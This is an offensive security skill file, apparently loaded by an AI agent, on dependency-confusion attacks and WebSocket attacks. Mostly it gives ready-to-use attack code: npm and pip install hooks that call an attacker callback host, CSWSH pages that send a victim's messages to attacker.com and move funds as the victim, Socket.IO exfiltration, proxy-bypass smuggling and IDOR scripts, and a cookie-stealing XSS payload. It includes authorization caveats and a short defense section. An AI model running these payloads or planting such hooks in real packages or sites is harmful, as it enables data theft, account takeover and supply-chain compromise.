Routing note: if the task comes from supply-chain, repository exposure, or CI-build recon, first use `recon-for-sec` to list internal package names and possible public-registry collisions.


## 1. CORE CONCEPT

1. **Private packages**: An organization ships libraries only on an internal registry (or under conventions that imply “ours”), e.g. a scoped name like `@org-scope/internal-utils` or an **unscoped** name such as `acme-billing-sdk`.
2. **Attacker squats the name**: The same package name is published on a **public** registry (npmjs, PyPI, RubyGems, etc.).
3. **Resolver preference**: Many setups resolve **highest matching version** across **all configured indexes** (or merge metadata), so a public `9.9.9` can beat a private `1.2.3` if ranges allow.
4. **Execution**: Package managers run **lifecycle scripts** (npm `preinstall`/`postinstall`, setuptools entry points, etc.) → **attacker code runs** on developer laptops, CI, or production image builds.

This is a **supply-chain** class issue: impact is often **broad** (many consumers) and **silent** until build or runtime hooks fire.

---

## 2. AFFECTED ECOSYSTEMS

| Ecosystem | Typical manifest | Confusion angle |
|-----------|------------------|-----------------|
| **npm** | `package.json` | **Scoped** packages (`@scope/pkg`) are **safer** when the scope is **owned** on the registry; **unscoped** private-style names are **high risk**. Multiple registries / `.npmrc` `registry` vs per-scope `@scope:registry=` misconfiguration increases risk. |
| **pip** | `requirements.txt`, `pyproject.toml`, `setup.py` | `pip install -i` / **`--extra-index-url`** merges indexes; a public index can serve a **higher version** for the same distribution name. |
| **RubyGems** | `Gemfile` | **`source`** order and additional sources; ambiguous gem names reachable from rubygems.org. |
| **Maven** | `pom.xml` | **Repository** declaration **order** and **mirror** settings; a public repo publishing the same `groupId:artifactId` under a higher version can win if policy allows. |
| **Composer** | `composer.json` | **Packagist** is default; private packages without **`repositories`**/`canonical` discipline may collide with public names. |
| **Docker** | `FROM`, image tags | **Typosquatting** on container registries (e.g. public hub) for images with names similar to internal base images. |

---

## 3. RECONNAISSANCE

**Where internal names leak**

- Committed **`package.json`**, **`requirements.txt`**, **`Gemfile`**, **`pom.xml`**, **`composer.json`** in repos or forks.
- **JavaScript source maps**, bundled assets, or **error stack traces** referencing package paths.
- **`.npmrc`**, **`.pypirc`**, **CI logs** showing install URLs or mirror endpoints.
- **Issue trackers**, **gist snippets**, and **dependency graphs** from SBOM exports.

**Check public squatting / claimability (read-only)**

```bash
# npm — metadata for a name (unscoped)
npm view some-internal-package-name version

# npm — scoped (requires scope to exist / be readable)
npm view @some-scope/internal-lib versions --json

# PyPI — dry-run style version probe (adjust name; fails if not found)
python3 -m pip install --dry-run 'some-internal-package-name==99.99.99'

# RubyGems — query remote
gem search '^some-internal-package-name$' --remote

# Maven Central — search coordinates (example pattern)
# curl "https://search.maven.org/solrsearch/select?q=g:com.example+AND+a:internal-lib&rows=1&wt=json"
```

Routing note: after package-name enumeration, consider PoC only in authorized environments; public registry lookups themselves are usually passive recon.

---

## 4. EXPLOITATION

**Authorized testing pattern**

1. **Register** (or use a controlled namespace) the **same package name** on the public registry your target resolver can reach.
2. Publish a **higher semver** than the legitimate internal line **within the victim’s declared range** (e.g. `^1.0.0` → publish `9.9.9`).
3. Add **lifecycle hooks** that prove execution without harming hosts—prefer **DNS/HTTP callback** to a collaborator you control, **no destructive writes**.

**npm `package.json` — minimal callback-style PoC (illustrative)**

```json
{
  "name": "some-internal-package-name",
  "version": "9.9.9",
  "description": "authorized dependency-confusion PoC only",
  "scripts": {
    "preinstall": "node -e \"require('https').get('https://YOUR_CALLBACK_HOST/poc?t='+process.env.npm_package_name)\""
  }
}
```

**npm `package.json` — shell + curl fallback (illustrative)**

```json
{
  "scripts": {
    "postinstall": "curl -fsS 'https://YOUR_CALLBACK_HOST/npm-postinstall' || true"
  }
}
```

**pip — setup hook pattern (illustrative; use only in authorized lab packages)**

```python
# setup.py (excerpt)
from setuptools import setup
from setuptools.command.install import install

class PoCInstall(install):
    def run(self):
        import urllib.request
        urllib.request.urlopen("https://YOUR_CALLBACK_HOST/pip-install")
        install.run(self)

setup(
    name="some-internal-package-name",
    version="9.9.9",
    cmdclass={"install": PoCInstall},
)
```

**Reference implementation (study / lab)**: community PoC layout and workflow similar to [`0xsapra/dependency-confusion-exploit`](https://github.com/0xsapra/dependency-confusion-exploit) — automate version bump, publish, and callback confirmation **only where you have written permission**.

---

## 5. TOOLS

| Tool | Role |
|------|------|
| [**visma-prodsec/confused**](https://github.com/visma-prodsec/confused) | Scans manifest files for dependency names that may be **claimable** on public registries (multi-ecosystem). |
| [**synacktiv/DepFuzzer**](https://github.com/synacktiv/DepFuzzer) | Automated **dependency confusion** testing workflows (use strictly in-scope). |

Run these only against **your** manifests or **authorized** engagements; do not use to squat names for unrelated third parties.

---

## 6. DEFENSE

- **npm**: Prefer **scoped** packages (`@org-scope/pkg`) with **org-owned** scopes; set **`.npmrc`** so private scopes map to private registry and **default `registry`** is not accidentally public for internal names.
- **Pinning**: **Exact versions** + **lockfiles** (`package-lock.json`, `poetry.lock`, `Gemfile.lock`, `composer.lock`) enforced in CI.
- **pip**: Avoid careless **`--extra-index-url`**; prefer **single private index** with **mirroring**, or **explicit `--index-url`** policies in CI.
- **Maven / Gradle**: Control **repository order**, use **internal mirrors**, and **block** unexpected groupIds on release pipelines.
- **Composer**: Use **`repositories`** with **`canonical: true`** for private packages; verify Packagist is not introducing unexpected vendors.
- **Defensive registration**: **Reserve** internal names on public registries (squat your own names) where policy allows.
- **Monitoring**: Tools such as **Socket.dev**, **Snyk**, or similar SBOM/supply-chain scanners to alert on **new publishers** or **version jumps** for critical packages.

---

## 7. DECISION TREE

```text
Do manifests reference package names that could be non-unique globally?
├─ NO → Dependency confusion unlikely from naming alone; pivot to typosquatting / compromised accounts.
└─ YES
    ├─ Is the private registry the ONLY source for that name (scoped + .npmrc / single index / mirror)?
    │   ├─ YES → Lower risk; still verify CI and developer machines do not override config.
    │   └─ NO → HIGH RISK
    │         ├─ Can a public registry publish a HIGHER version inside declared ranges?
    │         │   ├─ YES → Treat as exploitable in authorized tests; prove with callback PoC.
    │         │   └─ NO → Check pre-release tags, local `file:` deps, and stale lockfiles.
    │         └─ Are lifecycle scripts disabled/blocked in CI? (reduces impact, does not remove squat risk)
```

---

## Related routing

- **From `recon-for-sec`**: When doing **supply-chain reconnaissance**, cross-link leaked manifests and internal package identifiers with the checks in **Section 3** and the decision tree in **Section 7** before proposing any publish/PoC steps.


---
# Part 6: WebSocket Security


# SKILL: WebSocket Security

> **AI LOAD INSTRUCTION**: This skill covers WebSocket protocol basics, cross-site WebSocket hijacking (CSWSH), practical tooling bridges, and common vulnerability classes. Apply only in **authorized** tests; treat tokens and message content as sensitive. For REST/GraphQL companion testing, cross-load **[api-sec](../api-sec/SKILL.md)** when present in the workspace.

## 0. QUICK START

During proxy or raw traffic review, watch for:

```http
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: optional-subprotocol
```

Server success response indicators:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Routing note**: in Burp/browser DevTools, filter for `101` and `Upgrade: websocket`; for deeper API testing, align authn/authz models through `api-sec`.


## 1. PROTOCOL BASICS

### Client request (typical)

- **`Upgrade: websocket`** and **`Connection: Upgrade`** — required upgrade handshake.
- **`Sec-WebSocket-Key`** — base64 nonce; server hashes with magic GUID and responds with **`Sec-WebSocket-Accept`**.
- **`Sec-WebSocket-Version: 13`** — current standard version for browser interoperability.

### Server response

- **`HTTP/1.1 101 Switching Protocols`** — handshake complete; subsequent frames are WebSocket binary/text frames per RFC.

Minimal conceptual flow:

```text
Client: HTTP GET + Upgrade headers
Server: 101 + Sec-WebSocket-Accept
Channel: framed messages (text/binary), ping/pong, close
```

---

## 2. CROSS-SITE WEBSOCKET HIJACKING (CSWSH)

### Condition

- The server **does not validate `Origin`** (or equivalent binding) on the WebSocket handshake, **and**
- The victim has an **active session** (cookie-based or browser-stored creds) to the target site.

Then a malicious page loaded in the victim’s browser may open a WebSocket **as the victim**, similar in spirit to CSRF but for a **persistent bidirectional channel**.

### Proof-of-concept pattern (laboratory / authorized target only)

```javascript
const ws = new WebSocket('wss://vulnerable.example.com/messages');
ws.onopen = () => { ws.send('HELLO'); };
ws.onmessage = (event) => {
  fetch('https://attacker.example.net/?' + encodeURIComponent(event.data));
};
```

**Testing notes**: Confirm whether **`Origin`** is checked, whether **cookies** are sent (`SameSite` rules), and whether **subprotocol** or **custom headers** are required—missing checks increase CSWSH risk.

---

## 3. TESTING WITH TOOLS

### wsrepl

```bash
pip install wsrepl
wsrepl -u wss://target.example.com/ws -P auth_plugin.py
```

Use a **plugin** to reproduce browser cookies, headers, or token refresh during the WebSocket lifecycle.

### ws-harness (bridge to HTTP for other tools)

```bash
python ws-harness.py -u "ws://127.0.0.1:8765/path" -m ./message.txt
```

Example downstream use with SQL injection tooling over the bridged HTTP surface (adjust URL to local listener):

```bash
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch
```

### Burp Suite ecosystem

- **SocketSleuth** — inspect and manipulate WebSocket traffic inside Burp.
- **WebSocket Turbo Intruder** — high-rate or scripted message fuzzing.

---

## 4. COMMON VULNERABILITIES

| Issue | Why it matters |
|-------|----------------|
| Missing **`Origin`** validation | Enables **CSWSH** from attacker-controlled pages |
| **Auth token in URL** (`wss://host/ws?token=...`) | Logs, proxies, Referer leakage, browser history |
| **No rate limiting** on messages | Abuse, brute force, DoS |
| **`ws://` instead of `wss://`** | Cleartext on the wire (MITM) |
| **Injection in message bodies** | SQLi, command injection, or XSS if content is stored/reflected elsewhere |

Example sensitive URL anti-pattern:

```text
wss://api.example.com/stream?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Prefer **Sec-WebSocket-Protocol**, **first-message auth**, or **cookie + CSRF token** patterns aligned with product constraints.

---

## 5. DECISION TREE

1. **Identify endpoint** — From JS bundles, Swagger, or `101` responses; note `wss` vs `ws`.
2. **Handshake review** — Are **`Origin`**, **Host**, and **Cookie** policies correct? Any token in query string?
3. **Session binding** — Reconnect with **another user’s** cookie jar in Burp; compare subscription topics and data leakage.
4. **CSWSH** — Load a **local HTML** page that connects to the target with victim session active; verify server rejects wrong **Origin** or uses non-cookie secret.
5. **Message semantics** — Fuzz JSON/text payloads for injection; mirror same logic as HTTP API testing.
6. **Transport** — Flag **`ws://`** in production; verify TLS and HSTS alignment.

---

## 6. RELATED ROUTING

- From **[api-sec](../api-sec/SKILL.md)** — authentication, authorization, IDOR, and rate limiting often **mirror** HTTP APIs behind the same WebSocket routes.

**Note**: WebSocket often shares session and permission models with REST; use `api-sec` to align authentication and resource boundaries on the same backend.

---

## 7. CSWSH — STEP-BY-STEP EXPLOITATION

### Step 1: Confirm no Origin check on WS handshake

```text
# In Burp: intercept the WebSocket upgrade request
# Change Origin header to: https://attacker.com
# If 101 Switching Protocols returned → no Origin validation
# If 403/rejected → Origin is checked (test subdomain variants)
```

### Step 2: Craft attacker page

```html
<html>
<body>
<script>
const ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
    // Connection established as victim (cookies sent automatically)
    console.log('Connected as victim');
    // Send commands as victim
    ws.send(JSON.stringify({action: 'get_profile'}));
    ws.send(JSON.stringify({action: 'list_messages'}));
};

ws.onmessage = function(event) {
    // Exfiltrate all received messages
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: event.data
    });
};

ws.onerror = function(err) {
    fetch('https://attacker.com/error?e=' + encodeURIComponent(err));
};
</script>
</body>
</html>
```

### Step 3: Cookies and session hijacking

```text
Browser behavior for WebSocket:
- Cookies for the target domain ARE sent automatically in the upgrade request
- SameSite=None cookies always sent
- SameSite=Lax cookies: NOT sent (WebSocket is not top-level navigation)
- SameSite=Strict cookies: NOT sent

Key question: is the session cookie SameSite=None or legacy (no SameSite attribute)?
→ Legacy cookies default to Lax in modern Chrome but None in older browsers
```

### Step 4: Read/write messages as victim

```javascript
// Attacker can both READ and WRITE on the WebSocket
// Read: financial data, private messages, admin commands
// Write: transfer funds, change settings, send messages as victim

ws.onopen = () => {
    // Write: perform actions as victim
    ws.send(JSON.stringify({
        action: 'transfer',
        to: 'attacker_account',
        amount: 10000
    }));
};

ws.onmessage = (e) => {
    const data = JSON.parse(e.data);
    if (data.type === 'balance') {
        // Read: exfiltrate sensitive data
        navigator.sendBeacon('https://attacker.com/data',
            JSON.stringify(data));
    }
};
```

---

## 8. WEBSOCKET SMUGGLING

### Concept

Use the WebSocket upgrade to bypass reverse proxy restrictions, then tunnel arbitrary HTTP traffic through the WebSocket connection.

### Upgrade-based proxy bypass

```text
1. Reverse proxy restricts access to /admin (returns 403)
2. Client sends legitimate WebSocket upgrade to /ws
3. Proxy allows the upgrade (101 response)
4. After upgrade, proxy stops inspecting the connection (raw TCP passthrough)
5. Client sends raw HTTP request through the "WebSocket" connection:
   GET /admin HTTP/1.1
   Host: backend-server
6. Backend processes the HTTP request → 200 OK with admin content
```

### H2-over-WebSocket smuggling

```text
1. Connect to target via WebSocket
2. After upgrade, send HTTP/2 preface through the WebSocket tunnel
3. Backend HTTP/2 handler processes the smuggled requests
4. Bypass WAF/proxy rules that only inspect HTTP/1.1 traffic
```

### Implementation with Python

```python
import websocket
import ssl

ws = websocket.create_connection(
    'wss://target.com/ws',
    header=['Origin: https://target.com'],
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

# After upgrade, send raw HTTP through the tunnel
smuggled_request = (
    b"GET /admin/users HTTP/1.1\r\n"
    b"Host: internal-backend\r\n"
    b"Connection: close\r\n\r\n"
)
ws.send(smuggled_request, opcode=0x2)  # binary frame
response = ws.recv()
print(response)
```

### Proxy-specific behaviors

| Proxy | WebSocket Tunnel Behavior |
|-------|--------------------------|
| Nginx | Passes raw TCP after 101 — smuggling possible if backend doesn't validate WS frames |
| HAProxy | Depends on `option http-server-close` vs `tunnel` mode |
| AWS ALB | Terminates WebSocket — reframes traffic, harder to smuggle |
| Cloudflare | Inspects WebSocket frames — raw HTTP smuggling blocked |
| Varnish | Does not support WebSocket natively — upgrade may bypass cache entirely |

---

## 9. SOCKET.IO SPECIFIC VULNERABILITIES

### Namespace injection

Socket.IO supports namespaces (`/admin`, `/chat`). If authorization is only on the default namespace:

```javascript
// Client connects to privileged namespace without auth check
const adminSocket = io('https://target.com/admin');
adminSocket.on('connect', () => {
    adminSocket.emit('list_users');
});

// Server may not verify that the client is authorized for /admin namespace
```

### Event name injection

If event names are derived from user input:

```javascript
// Server-side vulnerable pattern:
socket.on(userInput, handler);

// Attacker sends event name that matches internal event:
socket.emit('__disconnect');     // force disconnect other clients
socket.emit('connection');        // re-trigger connection handler
socket.emit('error');             // trigger error handler
```

### Acknowledgement callback abuse

Socket.IO acknowledgements can return data. If the server sends sensitive data in ack callbacks:

```javascript
socket.emit('get_data', {id: 'admin'}, (response) => {
    // response may contain data the client shouldn't have access to
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(response)
    });
});
```

### Polling fallback CSRF

Socket.IO falls back to HTTP long-polling when WebSocket is unavailable. The polling transport uses regular HTTP requests with cookies → susceptible to CSRF if no additional token verification:

```text
POST /socket.io/?EIO=4&transport=polling&sid=SESSION_ID
Content-Type: application/octet-stream

4{"type":2,"data":["transfer",{"to":"attacker","amount":1000}]}
```

---

## 10. WEBSOCKET MESSAGE INJECTION

### In intercepted connections (MITM on `ws://`)

If the application uses `ws://` (unencrypted), an attacker on the same network can inject messages:

```text
1. ARP spoofing or network position to intercept traffic
2. Identify WebSocket frames in TCP stream
3. Inject crafted frames between legitimate messages
4. Both client→server and server→client injection possible
```

### Application-level injection

When WebSocket messages are concatenated or interpolated without sanitization:

```javascript
// Vulnerable server-side handler:
socket.on('chat', (msg) => {
    // If msg contains JSON metacharacters:
    broadcast(`{"user":"${username}","msg":"${msg}"}`);
    // Injection: msg = '","admin":true,"msg":"hacked'
    // Result: {"user":"attacker","msg":"","admin":true,"msg":"hacked"}
});
```

### Stored XSS via WebSocket

```text
1. Send WebSocket message: <img src=x onerror=alert(document.cookie)>
2. Server stores message and broadcasts to all connected clients
3. If client renders message as HTML → stored XSS
4. All connected users affected simultaneously
```

---

## 11. BINARY WEBSOCKET MESSAGE MANIPULATION

### Protobuf deserialization

Applications using Protocol Buffers over WebSocket may be vulnerable to:

```text
1. Capture binary WebSocket frame
2. Decode protobuf structure (use protoc --decode_raw or protobuf-inspector)
3. Modify field values (e.g., change user_id, amount, role)
4. Re-encode and send modified frame
5. Server deserializes without re-validating field constraints
```

```bash
# Decode captured binary frame
echo "CAPTURED_HEX" | xxd -r -p | protoc --decode_raw

# Output: field structure with types and values
# Modify, re-encode, send back through WebSocket
```

### MessagePack deserialization

```python
import msgpack
import websocket

ws = websocket.create_connection('wss://target.com/ws')

# Decode received binary message
raw = ws.recv()
data = msgpack.unpackb(raw, raw=False)
# data = {'action': 'get_balance', 'user_id': 123}

# Modify and re-send
data['user_id'] = 1  # IDOR: access admin's balance
ws.send(msgpack.packb(data), opcode=0x2)
```

### Type confusion attacks

Binary serialization formats may allow type confusion:

```text
# Original: user_id as integer (field type 0)
# Modified: user_id as string "1 OR 1=1" (field type 2)
# If server doesn't validate types after deserialization → SQL injection

# Original: is_admin as boolean false (0x00)
# Modified: is_admin as boolean true (0x01)
# Direct privilege escalation if server trusts deserialized values
```

### Tools for binary WebSocket analysis

| Tool | Purpose |
|------|---------|
| Burp Suite + SocketSleuth | Intercept and modify binary frames |
| `protobuf-inspector` | Decode unknown protobuf structures |
| `msgpack-tools` | Encode/decode MessagePack CLI |
| `wsdump` (websocket-client) | Raw frame capture and replay |
| Wireshark | Dissect WebSocket frames at protocol level |
